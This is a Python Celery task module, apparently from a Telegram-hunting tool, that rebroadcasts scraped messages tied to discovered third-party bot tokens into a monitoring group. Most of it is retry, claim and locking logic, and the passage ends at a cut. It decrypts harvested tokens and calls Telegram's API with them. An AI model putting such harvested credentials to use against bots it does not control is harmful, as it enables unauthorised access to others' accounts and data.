"""Broadcast flow task definitions."""

from .common import *

def _queue_revoked_topic_close(cred_id: str, reason: str) -> None:
    if not getattr(settings, "AUTO_CLOSE_REVOKED_TOPICS", True):
        return
    try:
        close_revoked_topics.apply_async(
            kwargs={
                "limit": 1,
                "dry_run": False,
                "credential_id": cred_id,
                "reason": reason,
            },
            countdown=5,
            queue="celery",
        )
    except Exception as exc:
        logger.warning(f"[TopicClose] Could not queue revoked-topic close for {cred_id}: {exc}")


def _broadcast_retry_delay_seconds(reason: str, retryable: bool, retry_after_seconds: int | None) -> int:
    if retry_after_seconds:
        base_delay = max(60, int(retry_after_seconds) + 30)
    elif not retryable:
        base_delay = 24 * 3600
    elif reason == "timeout":
        base_delay = 5 * 60
    elif reason == "network_disconnect":
        base_delay = 10 * 60
    elif reason == "topic_missing":
        base_delay = 60
    elif reason == "flood_wait":
        base_delay = 30 * 60
    else:
        base_delay = 15 * 60

    max_delay = max(60, int(os.getenv("BROADCAST_RETRY_MAX_DELAY_SECONDS", str(24 * 3600))))
    delay = min(base_delay, max_delay)
    if not retryable:
        return delay

    jitter_ratio = max(0.0, min(float(os.getenv("BROADCAST_RETRY_JITTER_RATIO", "0.20")), 0.50))
    jitter = int(delay * jitter_ratio)
    if jitter <= 0:
        return delay
    return max(60, delay + random.randint(-jitter, jitter))

_BROADCAST_RELIABILITY_COLUMNS_AVAILABLE: bool | None = None

_BROADCAST_RELIABILITY_LAST_CHECK = 0.0

def _is_missing_broadcast_reliability_column(exc: BaseException) -> bool:
    text = str(exc).lower()
    return (
        any(
            column in text
            for column in ("broadcast_error", "broadcast_attempts", "next_retry_at")
        )
        and (
            "column" in text
            or "schema cache" in text
            or "does not exist" in text
            or "42703" in text
            or "pgrst204" in text
        )
    )

def _can_use_broadcast_reliability_columns() -> bool:
    if _BROADCAST_RELIABILITY_COLUMNS_AVAILABLE is not False:
        return True
    return time.time() - _BROADCAST_RELIABILITY_LAST_CHECK > 300

def _set_broadcast_reliability_columns_available(value: bool) -> None:
    global _BROADCAST_RELIABILITY_COLUMNS_AVAILABLE
    global _BROADCAST_RELIABILITY_LAST_CHECK
    _BROADCAST_RELIABILITY_COLUMNS_AVAILABLE = value
    _BROADCAST_RELIABILITY_LAST_CHECK = time.time()

async def _fetch_pending_broadcast_messages(batch_size: int, now_iso: str) -> list[dict[str, Any]]:
    base_query = (
        db.table("exfiltrated_messages")
        .select("*, discovered_credentials!inner(meta)")
        .eq("is_broadcasted", False)
    )

    if _can_use_broadcast_reliability_columns():
        try:
            response = await async_execute(
                base_query
                .or_(f"next_retry_at.is.null,next_retry_at.lte.{now_iso}")
                .order("telegram_msg_id", desc=False)
                .limit(batch_size)
            )
            _set_broadcast_reliability_columns_available(True)
            return response.data or []
        except Exception as exc:
            if not _is_missing_broadcast_reliability_column(exc):
                raise
            _set_broadcast_reliability_columns_available(False)
            logger.warning(
                "[Broadcast] Reliability columns missing; using legacy pending query. "
                "Apply database/migrations/2026-08-02-scrape-broadcast-reliability.sql "
                "to enable retry scheduling."
            )

    response = await async_execute(
        db.table("exfiltrated_messages")
        .select("*, discovered_credentials!inner(meta)")
        .eq("is_broadcasted", False)
        .order("telegram_msg_id", desc=False)
        .limit(batch_size)
    )
    return response.data or []

async def _apply_broadcast_claimed_update(
    msg_id: str,
    payload: dict[str, Any],
    claim_token: str | None,
) -> bool:
    """Write broadcast state only while this worker still owns the row claim."""
    if not claim_token:
        return False
    response = await async_execute(
        db.table("exfiltrated_messages")
        .update(payload)
        .eq("id", msg_id)
        .eq("broadcast_claimed_at", claim_token)
    )
    return bool(response.data)

async def _is_broadcast_claim_valid(
    msg_id: str,
    claim_token: str,
    lease_minutes: int,
) -> bool:
    """Confirm the broadcast claim is still owned and within its lease."""
    from datetime import datetime, timedelta

    cutoff = (datetime.now(UTC) - timedelta(minutes=lease_minutes)).isoformat()
    response = await async_execute(
        db.table("exfiltrated_messages")
        .select("id")
        .eq("id", msg_id)
        .eq("is_broadcasted", False)
        .eq("broadcast_claimed_at", claim_token)
        .gte("broadcast_claimed_at", cutoff)
        .limit(1)
    )
    return bool(response.data)

async def _update_message_broadcast_success(
    msg_id: str,
    broadcast_message_id: int | None = None,
    claim_token: str | None = None,
    additional_payload: dict[str, Any] | None = None,
) -> bool:
    from datetime import datetime

    now_iso = datetime.now(UTC).isoformat()
    payload: dict[str, Any] = {
        "is_broadcasted": True,
        "broadcast_claimed_at": None,
        "broadcasted_at": now_iso,
    }
    if additional_payload:
        payload.update(additional_payload)
    if broadcast_message_id is not None:
        # INTR-001: persist so retries recognise a prior successful send
        # and skip the duplicate `sendMessage` call.
        payload["broadcast_message_id"] = broadcast_message_id
        payload["broadcast_status"] = "sent"
    if _can_use_broadcast_reliability_columns():
        try:
            updated = await _apply_broadcast_claimed_update(
                msg_id,
                {
                    **payload,
                    "broadcast_error": None,
                    "next_retry_at": None,
                },
                claim_token,
            )
            if not updated:
                return False
            _set_broadcast_reliability_columns_available(True)
            return True
        except Exception as exc:
            exc_str = str(exc)
            if _is_missing_broadcast_reliability_column(exc):
                _set_broadcast_reliability_columns_available(False)
                logger.warning(
                    "[Broadcast] Reliability columns missing on success update; "
                    "falling back to legacy broadcast status update."
                )
                # Drop the new columns (broadcast_message_id, broadcast_status)
                # from the fallback path so a pre-migration DB doesn't reject.
                payload.pop("broadcast_message_id", None)
                payload.pop("broadcast_status", None)
            elif "broadcast_message_id" in exc_str or "broadcast_status" in exc_str:
                # Migration 20260906000003 not applied yet — drop those two
                # columns and retry the full update in this same block.
                logger.warning(
                    "[Broadcast] broadcast_message_id/broadcast_status column missing; "
                    "apply supabase/migrations/20260906000003_broadcast_reliability_ext.sql. "
                    "Falling back to update without idempotency tracking."
                )
                payload.pop("broadcast_message_id", None)
                payload.pop("broadcast_status", None)
                return await _apply_broadcast_claimed_update(
                    msg_id,
                    {
                        **payload,
                        "broadcast_error": None,
                        "next_retry_at": None,
                    },
                    claim_token,
                )
            elif "broadcasted_at" in exc_str:
                # Column not yet migrated — retry without it
                logger.warning(
                    "[Broadcast] broadcasted_at column missing; apply migration "
                    "supabase/migrations/20260803000001_broadcasted_at.sql. "
                    "Falling back to legacy update."
                )
                payload.pop("broadcasted_at", None)
                payload.pop("broadcast_message_id", None)
                payload.pop("broadcast_status", None)
                return await _apply_broadcast_claimed_update(msg_id, payload, claim_token)
            else:
                raise

    # Legacy path — column-existence unknown, try WITH broadcasted_at first
    # broadcast_message_id and broadcast_status are stripped here because
    # they're guarded by the new migration 20260906000003.
    payload.pop("broadcast_message_id", None)
    payload.pop("broadcast_status", None)
    try:
        return await _apply_broadcast_claimed_update(msg_id, payload, claim_token)
    except Exception as exc:
        if "broadcasted_at" in str(exc):
            payload.pop("broadcasted_at", None)
            return await _apply_broadcast_claimed_update(msg_id, payload, claim_token)
        else:
            raise

async def _mark_broadcast_failure(
    msg: dict[str, Any],
    exc: BaseException,
    claim_token: str | None = None,
) -> bool:
    from datetime import datetime, timedelta

    msg_id = msg["id"]
    reason = getattr(exc, "reason", exc.__class__.__name__)
    retryable = bool(getattr(exc, "retryable", True))
    detail = getattr(exc, "detail", str(exc)) or reason
    retry_after_seconds = getattr(exc, "retry_after_seconds", None)
    now = datetime.now(UTC)
    attempts = int(msg.get("broadcast_attempts") or 0) + 1

    # DATA-003 / REL-003: cap infinite retry. When attempts exceed the budget,
    # move the row to a terminal `permanent_failed` state so the retry pool
    # stops churning on it. Row stays visible for operator triage via
    # broadcast_status='permanent_failed'.
    max_attempts = int(os.getenv("MAX_BROADCAST_ATTEMPTS", 8))
    if attempts >= max_attempts:
        terminal_payload: dict[str, Any] = {
            "is_broadcasted": True,  # exits the retry pool
            "broadcast_claimed_at": None,
            "broadcast_status": "permanent_failed",
            "broadcast_error": {
                "reason": reason,
                "detail": str(detail)[:500],
                "retryable": False,
                "failed_at": now.isoformat(),
                "terminal_at_attempts": attempts,
            },
            "broadcast_attempts": attempts,
            "next_retry_at": None,
        }
        try:
            updated = await _apply_broadcast_claimed_update(msg_id, terminal_payload, claim_token)
            if not updated:
                return False
            _set_broadcast_reliability_columns_available(True)
        except Exception as terminal_exc:
            terminal_str = str(terminal_exc)
            # If the new broadcast_status column isn't migrated yet, drop it
            # and try again — we still want to exit the retry pool.
            if "broadcast_status" in terminal_str:
                terminal_payload.pop("broadcast_status", None)
                try:
                    updated = await _apply_broadcast_claimed_update(msg_id, terminal_payload, claim_token)
                except Exception as fallback_exc:
                    logger.error(f"[Broadcast] terminal fallback failed for {msg_id}: {fallback_exc}")
                    return False
                if not updated:
                    return False
            else:
                logger.error(
                    f"[Broadcast] terminal update failed for {msg_id}: {terminal_str[:200]}"
                )
                return False
        AuditLogger.log(
            AuditEvent.BROADCAST_FAILED,
            credential_id=msg.get("credential_id"),
            details={
                "message_id": msg_id,
                "reason": reason,
                "retryable": False,
                "attempts": attempts,
                "terminal": True,
            },
            success=False,
        )
        logger.warning(
            f"    🛑 [Broadcast] {msg_id} moved to permanent_failed after "
            f"{attempts} attempts (reason={reason})"
        )
        return True

    delay_seconds = _broadcast_retry_delay_seconds(reason, retryable, retry_after_seconds)
    next_retry_at = (now + timedelta(seconds=delay_seconds)).isoformat()
    payload = {
        "broadcast_claimed_at": None,
        "broadcast_error": {
            "reason": reason,
            "detail": str(detail)[:500],
            "retryable": retryable,
            "failed_at": now.isoformat(),
        },
        "broadcast_attempts": attempts,
        "next_retry_at": next_retry_at,
    }
    try:
        updated = await _apply_broadcast_claimed_update(msg_id, payload, claim_token)
        if not updated:
            return False
        _set_broadcast_reliability_columns_available(True)
    except Exception as update_exc:
        if not _is_missing_broadcast_reliability_column(update_exc):
            raise
        _set_broadcast_reliability_columns_available(False)
        logger.warning(
            "[Broadcast] Reliability columns missing on failure update; clearing claim only. "
            "Apply database/migrations/2026-08-02-scrape-broadcast-reliability.sql "
            "to persist broadcast errors and retry times."
        )
        updated = await _apply_broadcast_claimed_update(
            msg_id,
            {"broadcast_claimed_at": None},
            claim_token,
        )
        if not updated:
            return False
    AuditLogger.log(
        AuditEvent.BROADCAST_FAILED,
        credential_id=msg.get("credential_id"),
        details={
            "message_id": msg_id,
            "reason": reason,
            "retryable": retryable,
            "attempts": attempts,
            "next_retry_at": next_retry_at,
        },
        success=False,
    )
    return True

@app.task(name="flow.broadcast_pending")
def broadcast_pending():
    if not settings.ENABLE_RAW_MESSAGE_BROADCAST:
        # LOGIC-003: surface disabled-run counter so operators can distinguish
        # "beat is firing but skipped" from "beat is not firing".
        try:
            from app.core.metrics import metrics
            metrics.inc("broadcast.disabled_run")
        except Exception as _swallowed:
            logger.debug(f"[suppressed] {_swallowed}")
        return "Disabled: raw message broadcast is opt-in; use the findings queue."
    # Distributed Lock to prevent race conditions (e.g. Local Worker vs Prod Worker)
    lock_key = "telegram_hunter:lock:broadcast"
    # TTL = 120s initial; renewed every 90s while the batch runs so it never expires
    # mid-batch regardless of batch size. Replaces the old fixed-240s TTL that expired
    # on large backlogs (500 msgs × 1.5s = 750s >> 240s).
    LOCK_TTL = 120  # noqa: N806 — function-scoped constant
    RENEW_EVERY = 90  # noqa: N806 — function-scoped constant  # renew when < 30s remain
    lock = redis_client.lock(lock_key, timeout=LOCK_TTL, blocking=False)

    acquired = lock.acquire()
    if not acquired:
        # CONC-001: surface skip to operator logs so beat cadence is visible
        # even when a concurrent run holds the lock.
        logger.info("[Broadcast] Skipped — lock held by another worker")
        return "Skipped: Broadcast task already running (Lock active)."

    # Check Pause State
    if redis_client.get("system:paused"):
        lock.release()
        return "System Paused"

    # Background thread renews the lock periodically while the async loop runs
    import threading
    _stop_renew = threading.Event()

    def _renew_loop():
        while not _stop_renew.wait(timeout=RENEW_EVERY):
            try:
                lock.reacquire()
            except Exception:
                break  # lock gone — stop silently

    renew_thread = threading.Thread(target=_renew_loop, daemon=True)
    renew_thread.start()

    try:
        from app.workers.celery_app import get_worker_loop
        return get_worker_loop().run_until_complete(_broadcast_logic())
    finally:
        _stop_renew.set()
        renew_thread.join(timeout=2)
        with contextlib.suppress(redis.exceptions.LockError):
            lock.release()  # Lock expired or already released

async def _broadcast_logic():
    """
    Broadcast pending messages to Telegram topics.
    Uses DB-level atomic claims to prevent duplicates across ALL environments.
    """
    if not settings.ENABLE_RAW_MESSAGE_BROADCAST:
        return "Disabled: raw message broadcast is opt-in; use the findings queue."

    from datetime import datetime, timedelta

    from app.core.metrics import metrics

    broadcaster = get_broadcaster()

    from app.core.constants import CLAIM_TIMEOUT_MINUTES
    stale_threshold = datetime.now(UTC) - timedelta(minutes=CLAIM_TIMEOUT_MINUTES)
    now_iso = datetime.now(UTC).isoformat()

    # Batch size: env-configurable. Default 200 (200 × 1.5s = 300s per run,
    # fits inside CLAIM_TIMEOUT_MINUTES=15 with headroom).
    # Raise via BROADCAST_BATCH_SIZE=500 if you have enough bot credentials
    # in the rotation pool to sustain the higher send rate without flood-wait.
    BROADCAST_BATCH_SIZE = int(os.getenv("BROADCAST_BATCH_SIZE", 200))  # noqa: N806 — function-scoped constant
    messages = await _fetch_pending_broadcast_messages(BROADCAST_BATCH_SIZE, now_iso)
    if not messages:
        # Only log periodically or if verbose debug needed?
        # For now, let's log it to confirm the task is running.
        logger.info("💤 No pending broadcasts found.")
        return "No pending broadcasts."

    group_id = settings.MONITOR_GROUP_ID
    sent_count = 0
    skipped_count = 0
    already_done_count = 0
    # Local cache to avoid DB roundtrips within this batch if multiple messages for same cred
    cached_topic_ids = {}

    # PERF-002: parallelise broadcast across cred_id groups. Each cred_id's
    # messages stay sequential (Telegram flood-wait is per-chat/topic), but up
    # to BROADCAST_MAX_PARALLEL_TOPICS distinct topics run concurrently. The
    # bot pool has itertools.cycle rotation, so effective concurrency is bounded
    # by min(MAX_PARALLEL_TOPICS, len(bot_pool)).
    #
    # On single-bot deployments (MONITOR_BOT_TOKEN=<one>) set
    # BROADCAST_MAX_PARALLEL_TOPICS=1 so we stay serial and avoid tripping
    # per-bot flood_wait. The adaptive delay below handles the pacing.
    _max_parallel = int(os.getenv("BROADCAST_MAX_PARALLEL_TOPICS", 5))
    _base_delay = float(os.getenv("BROADCAST_INTER_MESSAGE_DELAY_SECONDS", 0.5))
    _topic_semaphore = asyncio.Semaphore(_max_parallel)

    # PERF-002: adaptive inter-message delay. Persisted in Redis so the
    # backoff state carries across broadcast runs (a run only lasts ~5 min).
    #   * On any flood_wait during a send: reset to BASE * 1.5 (hard bump).
    #   * After 10 consecutive non-flood sends: multiply by 0.9 (gradual).
    # Bounded to [1.0s, 10.0s]. Base = BROADCAST_INTER_MESSAGE_DELAY_SECONDS.
    _ADAPTIVE_DELAY_KEY = "broadcast:adaptive_delay"  # noqa: N806 — function-scoped constant
    _ADAPTIVE_MIN = 1.0  # noqa: N806 — function-scoped constant
    _ADAPTIVE_MAX = 10.0  # noqa: N806 — function-scoped constant

    def _clamp_delay(v: float) -> float:
        return max(_ADAPTIVE_MIN, min(_ADAPTIVE_MAX, v))

    def _load_adaptive_delay() -> float:
        try:
            raw = redis_client.get(_ADAPTIVE_DELAY_KEY)
            if raw is not None:
                return _clamp_delay(float(raw))
        except Exception as _swallowed:
            logger.debug(f"[Broadcast] adaptive delay load failed: {_swallowed}")
        return _clamp_delay(_base_delay)

    def _persist_adaptive_delay(v: float) -> None:
        try:
            # 24 h TTL — refreshed on every write, avoids stale values sticking
            # around indefinitely if broadcasting is disabled long-term.
            redis_client.setex(_ADAPTIVE_DELAY_KEY, 86400, f"{v:.3f}")
        except Exception as _swallowed:
            logger.debug(f"[Broadcast] adaptive delay persist failed: {_swallowed}")

    _adaptive_state: dict[str, float | int] = {
        "delay": _load_adaptive_delay(),
        "consecutive_ok": 0,
        # Snapshot the broadcaster's flood counter so deltas within this run
        # are attributable to sends we made. Defensive getattr — some test
        # doubles won't have the attribute.
        "last_flood_hits": getattr(broadcaster, "_flood_wait_hits", 0),
    }
    _run_started = time.time()
    logger.info(
        f"[Broadcast] starting run: batch={len(messages)}, groups={len({m['credential_id'] for m in messages})}, "
        f"delay={_adaptive_state['delay']:.2f}s (base={_base_delay:.2f}s), max_parallel={_max_parallel}"
    )

    from collections import defaultdict
    _grouped: dict[str, list[dict]] = defaultdict(list)
    for _m in messages:
        _grouped[_m["credential_id"]].append(_m)

    async def _process_topic_group(cred_id: str, group_msgs: list[dict]) -> tuple[int, int]:
        """Process all pending messages for a single cred_id sequentially.
        Returns (sent, skipped) counters for this group.
        """
        local_sent = 0
        local_skipped = 0

        async with _topic_semaphore:
            for msg in group_msgs:
                msg_id = msg["id"]

                try:
                    # ==========================================================
                    # STEP 1: ATOMIC CLAIM via DB (works across ALL environments)
                    # ==========================================================
                    # Single conditional UPDATE — only succeeds if message is unclaimed and not yet broadcast.
                    # This eliminates the TOCTOU race between check and claim.
                    claim_time = datetime.now(UTC).isoformat()

                    # Attempt to claim an unclaimed message
                    claim_result = await async_execute(db.table("exfiltrated_messages")\
                        .update({"broadcast_claimed_at": claim_time})\
                        .eq("id", msg_id)\
                        .eq("is_broadcasted", False)\
                        .is_("broadcast_claimed_at", "null")
                        )

                    if not claim_result.data:
                        # Either already broadcasted, or claimed by another worker.
                        # Try reclaiming if the existing claim is stale.
                        stale_iso = stale_threshold.isoformat()
                        reclaim_result = await async_execute(db.table("exfiltrated_messages")\
                            .update({"broadcast_claimed_at": claim_time})\
                            .eq("id", msg_id)\
                            .eq("is_broadcasted", False)\
                            .lt("broadcast_claimed_at", stale_iso)
                            )

                        if not reclaim_result.data:
                            # Could not claim — either done or freshly claimed by another worker
                            local_skipped += 1
                            continue

                        logger.warning(f"    🔄 Stale claim reclaimed for {msg_id}")

                    logger.info(f"    📌 Claimed message {msg_id}")

                    # Extract meta from the joined discovered_credentials
                    cred_info = msg.get("discovered_credentials", {})
                    meta = cred_info.get("meta", {}) if cred_info else {}

                    # 1. Resolve Topic Name (Always needed for potential recreation)
                    # Priority: @username / botid -> chat_name -> Cred-ID
                    bot_username = meta.get("bot_username")
                    bot_id = meta.get("bot_id")

                    # Resolve unknown usernames via getMe before creating/finding topics
                    if (not bot_username or bot_username == "unknown") and bot_id:
                        try:
                            cred_res = await async_execute(
                                db.table("discovered_credentials")
                                .select("bot_token").eq("id", cred_id).single()
                            )
                            if cred_res.data:
                                raw_token = cred_res.data.get("bot_token") if isinstance(cred_res.data, dict) else cred_res.data[0]["bot_token"]
                                decrypted = security.decrypt(raw_token).strip()
                                async with httpx.AsyncClient(timeout=10.0) as _hc:
                                    gm = await _hc.get(f"https://api.telegram.org/bot{decrypted}/getMe")
                                    if gm.status_code == 200:
                                        gm_data = gm.json().get("result", {})
                                        resolved_username = gm_data.get("username")
                                        if resolved_username:
                                            bot_username = resolved_username
                                            # Persist resolved username to DB
                                            fresh_meta = await async_execute(
                                                db.table("discovered_credentials")
                                                .select("meta").eq("id", cred_id).single()
                                            )
                                            upd_meta = dict((fresh_meta.data or {}).get("meta") or {})
                                            upd_meta["bot_username"] = bot_username
                                            await async_execute(
                                                db.table("discovered_credentials")
                                                .update({"meta": upd_meta}).eq("id", cred_id)
                                            )
                                            # Rename existing @unknown topic if it has a cached thread_id
                                            old_topic_id = upd_meta.get("topic_id")
                                            if old_topic_id:
                                                new_name = f"@{bot_username} / {bot_id}"
                                                await broadcaster.rename_topic(group_id, old_topic_id, new_name)
                                                logger.info(f"    Renamed topic {old_topic_id} from @unknown to @{bot_username}")
                        except Exception as e_resolve:
                            logger.debug(f"[Broadcast] Could not resolve username for bot_id {bot_id}: {e_resolve}")

                    if bot_username and bot_username != "unknown" and bot_id:
                        topic_name = f"@{bot_username} / {bot_id}"
                    elif bot_id:
                        topic_name = f"@unknown / {bot_id}"
                    elif meta.get("chat_name"):
                        topic_name = f"{meta.get('chat_name')} (Legacy)"
                    else:
                        topic_name = f"Cred-{cred_id[:8]}"

                    # 2. Check Cache/DB for ID
                    thread_id = cached_topic_ids.get(cred_id) or meta.get("topic_id")

                    if not thread_id:
                        # Determines if we need to fetch token for legacy fallback
                        if "unknown" in topic_name and not bot_id:
                            try:
                                cred_res = await async_execute(db.table("discovered_credentials").select("bot_token").eq("id", cred_id).single())
                                if cred_res.data:
                                    # .single() returns a dict, not a list — access directly
                                    raw_token = cred_res.data.get("bot_token") if isinstance(cred_res.data, dict) else cred_res.data[0]["bot_token"]
                                    decrypted = security.decrypt(raw_token)
                                    if ":" in decrypted:
                                        bot_id = decrypted.split(":")[0]
                                        meta["bot_id"] = bot_id
                                        topic_name = f"@unknown / {bot_id}"
                            except Exception as e_dec:
                                logger.debug(f"[Broadcast] Could not decrypt token for legacy bot_id extraction: {e_dec}")

                        # Ensure Topic — raises on failure so message is retried later
                        try:
                            thread_id = await broadcaster.ensure_topic(group_id, topic_name)
                        except Exception as e_topic:
                            logger.error(f"    ❌ [Broadcast] Topic creation failed for {cred_id}: {e_topic}")
                            from app.services.broadcaster_srv import BroadcastSendError

                            await _mark_broadcast_failure(
                                msg,
                                BroadcastSendError(
                                    "topic_missing",
                                    f"Could not create topic '{topic_name}': {e_topic}",
                                    retryable=True,
                                ),
                                claim_token=claim_time,
                            )
                            continue

                        # Re-fetch meta before write — prevents overwriting concurrent enrich updates
                        fresh = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
                        meta = dict((fresh.data or {}).get("meta") or {})
                        meta["topic_id"] = thread_id
                        await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
                        logger.info(f"    📝 [Broadcast] Saved topic_id {thread_id} for {cred_id}")

                    # Update local cache
                    cached_topic_ids[cred_id] = thread_id

                    # INTR-001: idempotent broadcast — if a prior run already sent this
                    # message (Telegram message-id persisted), skip the send call and
                    # mark broadcasted directly. Prevents duplicate broadcast when a
                    # worker was killed between successful send and DB write.
                    prior_broadcast_msg_id = msg.get("broadcast_message_id")

                    # Snapshot flood counter before the send attempt so we can
                    # detect a mid-flight flood_wait even when send rotation
                    # eventually succeeds (multi-bot case).
                    _pre_hits = getattr(broadcaster, "_flood_wait_hits", 0)
                    performed_real_send = False

                    # Send Message (with retry for deleted topics)
                    send_success = False
                    sent_message_id: int | None = None
                    if prior_broadcast_msg_id is not None:
                        logger.info(
                            f"    ⏭️  Skipping send — broadcast_message_id={prior_broadcast_msg_id} "
                            f"already recorded for msg {msg_id}"
                        )
                        sent_message_id = int(prior_broadcast_msg_id)
                        send_success = True
                    else:
                        try:
                            if not await _is_broadcast_claim_valid(
                                msg_id,
                                claim_time,
                                lease_minutes=CLAIM_TIMEOUT_MINUTES,
                            ):
                                logger.warning(f"    ⏱️ Broadcast claim expired before send for {msg_id}")
                                local_skipped += 1
                                continue
                            sent_message_id = await broadcaster.send_message(group_id, thread_id, msg)
                            send_success = True
                            performed_real_send = True
                        except Exception as e:
                            performed_real_send = True
                            # Check for topic deletion/not found
                            err_str = str(e)
                            failure_reason = getattr(e, "reason", "")
                            if (
                                failure_reason == "topic_missing"
                                or "Topic_deleted" in err_str
                                or "message thread not found" in err_str
                                or "TOPIC_DELETED" in err_str
                            ):
                                logger.warning(f"    ⚠️ Topic {thread_id} deleted! Recreating '{topic_name}'...")
                                try:
                                    thread_id = await broadcaster.ensure_topic(group_id, topic_name)
                                    # Re-fetch meta before write
                                    fresh2 = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
                                    meta = dict((fresh2.data or {}).get("meta") or {})
                                    meta["topic_id"] = thread_id
                                    await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
                                    cached_topic_ids[cred_id] = thread_id
                                    # Retry Send
                                    if not await _is_broadcast_claim_valid(
                                        msg_id,
                                        claim_time,
                                        lease_minutes=CLAIM_TIMEOUT_MINUTES,
                                    ):
                                        logger.warning(f"    ⏱️ Broadcast claim expired before retry for {msg_id}")
                                        local_skipped += 1
                                        continue
                                    sent_message_id = await broadcaster.send_message(group_id, thread_id, msg)
                                    send_success = True
                                except Exception as retry_e:
                                    logger.error(f"    ❌ Failed after topic recreation: {retry_e}")
                                    await _mark_broadcast_failure(msg, retry_e, claim_token=claim_time)
                            else:
                                logger.error(f"    ❌ Send failed: {e}")
                                await _mark_broadcast_failure(msg, e, claim_token=claim_time)

                    if send_success:
                        # ==============================================
                        # SUCCESS: Mark as broadcasted and clear claim
                        # ==============================================
                        completed = await _update_message_broadcast_success(
                            msg_id,
                            broadcast_message_id=sent_message_id,
                            claim_token=claim_time,
                        )
                        if not completed:
                            logger.warning(f"    ⏱️ Broadcast completion fenced out for {msg_id}")
                            local_skipped += 1
                            continue
                        local_sent += 1
                        if performed_real_send:
                            # PERF-002: only count metric for real over-the-wire sends,
                            # not idempotent skip-paths (INTR-001).
                            try:
                                metrics.inc("broadcast.sent")
                            except Exception as _swallowed:
                                logger.debug(f"[Broadcast] metrics.inc failed: {_swallowed}")
                        logger.info(f"    ✅ Broadcasted msg {msg_id}")
                    else:
                        logger.warning(f"    🔄 Broadcast failure recorded for retry: {msg_id}")

                    # PERF-002: adaptive delay bookkeeping.
                    # Only real send attempts (whether they succeeded or failed) can
                    # signal a flood_wait event or a "clean" streak — idempotent
                    # skip paths leave the adaptive state untouched.
                    if performed_real_send:
                        _post_hits = getattr(broadcaster, "_flood_wait_hits", 0)
                        _flood_this_send = _post_hits > _pre_hits
                        if _flood_this_send:
                            _adaptive_state["consecutive_ok"] = 0
                            _adaptive_state["last_flood_hits"] = _post_hits
                            _new_delay = _clamp_delay(_base_delay * 1.5)
                            if _new_delay != _adaptive_state["delay"]:
                                logger.info(
                                    f"[Broadcast] flood_wait observed — bumping delay "
                                    f"{_adaptive_state['delay']:.2f}s -> {_new_delay:.2f}s"
                                )
                                _adaptive_state["delay"] = _new_delay
                                _persist_adaptive_delay(_new_delay)
                        elif send_success:
                            _adaptive_state["consecutive_ok"] = int(_adaptive_state["consecutive_ok"]) + 1
                            if _adaptive_state["consecutive_ok"] >= 10:
                                _new_delay = _clamp_delay(float(_adaptive_state["delay"]) * 0.9)
                                if _new_delay != _adaptive_state["delay"]:
                                    logger.info(
                                        f"[Broadcast] 10 consecutive clean sends — reducing delay "
                                        f"{_adaptive_state['delay']:.2f}s -> {_new_delay:.2f}s"
                                    )
                                    _adaptive_state["delay"] = _new_delay
                                    _persist_adaptive_delay(_new_delay)
                                _adaptive_state["consecutive_ok"] = 0

                    # Per-topic serial send with adaptive delay + cross-topic
                    # parallelism yields the throughput gain (PERF-002).
                    await asyncio.sleep(float(_adaptive_state["delay"]))

                except Exception as e:
                    logger.error(f"Error broadcasting msg {msg_id}: {e}")
                    try:
                        await _mark_broadcast_failure(
                            msg,
                            e,
                            claim_token=claim_time,
                        )
                    except Exception as e_claim:
                        logger.error(f"Failed to clear broadcast claim for msg {msg_id}: {e_claim} — message may be stuck until stale-claim TTL expires")
                    continue

        return local_sent, local_skipped

    # Fan out per-cred_id groups in parallel.
    _group_results = await asyncio.gather(
        *[_process_topic_group(cid, grp) for cid, grp in _grouped.items()],
        return_exceptions=True,
    )
    for _r in _group_results:
        if isinstance(_r, Exception):
            logger.error(f"[Broadcast] topic-group crashed: {_r}")
            continue
        _s, _sk = _r
        sent_count += _s
        skipped_count += _sk

    # PERF-002: compute and persist actual msg/min throughput for this run.
    # Stored in Redis so the health endpoint / dashboard can surface a live
    # rate without keeping process-local state. Guarded so a Redis outage
    # doesn't fail the broadcast run.
    _elapsed_s = max(time.time() - _run_started, 1e-6)
    _throughput_per_min = (sent_count * 60.0) / _elapsed_s if sent_count > 0 else 0.0
    try:
        redis_client.setex(
            "metrics:broadcast:throughput_per_min",
            3600,
            f"{_throughput_per_min:.2f}",
        )
    except Exception as _swallowed:
        logger.debug(f"[Broadcast] throughput persist failed: {_swallowed}")
    logger.info(
        f"[Broadcast] run complete: sent={sent_count} skipped={skipped_count} "
        f"elapsed={_elapsed_s:.1f}s throughput={_throughput_per_min:.1f} msg/min "
        f"final_delay={_adaptive_state['delay']:.2f}s"
    )

    result = f"Broadcasted {sent_count}/{len(messages)} messages"
    if skipped_count > 0:
        result += f" (skipped {skipped_count} claimed by other workers)"
    if already_done_count > 0:
        result += f" (already done: {already_done_count})"
    return result

@app.task(name="flow.retry_failed_broadcasts")
def retry_failed_broadcasts(limit: int = 50):
    """Make failed unbroadcasted messages immediately eligible and trigger broadcast."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_retry_failed_broadcasts_logic(limit))

async def _retry_failed_broadcasts_logic(limit: int = 50) -> dict:
    limit = max(1, min(int(limit or 50), 500))
    try:
        response = await async_execute(
            db.table("exfiltrated_messages")
            .select("id, credential_id, broadcast_error, broadcast_attempts, next_retry_at")
            .eq("is_broadcasted", False)
            .not_.is_("broadcast_error", "null")
            .order("next_retry_at", desc=False)
            .limit(limit)
        )
        _set_broadcast_reliability_columns_available(True)
    except Exception as exc:
        if _is_missing_broadcast_reliability_column(exc):
            _set_broadcast_reliability_columns_available(False)
            return {
                "status": "schema_missing",
                "reason": "broadcast reliability columns are not available",
            }
        raise

    rows = response.data or []
    if not rows:
        return {"status": "idle", "updated": 0, "broadcast_dispatched": False}

    updated = 0
    for row in rows:
        await async_execute(
            db.table("exfiltrated_messages")
            .update({"broadcast_claimed_at": None, "next_retry_at": None})
            .eq("id", row["id"])
            .eq("is_broadcasted", False)
        )
        updated += 1

    app.send_task("flow.broadcast_pending")
    AuditLogger.log(
        AuditEvent.BROADCAST_RETRY_REQUESTED,
        user="celery_worker",
        details={
            "mode": "batch",
            "updated": updated,
            "limit": limit,
            "message_ids": [row.get("id") for row in rows[:20]],
            "truncated": len(rows) > 20,
        },
    )
    return {
        "status": "ok",
        "updated": updated,
        "broadcast_dispatched": True,
        "message_ids": [row.get("id") for row in rows],
    }

@app.task(name="flow.close_revoked_topics")
def close_revoked_topics(
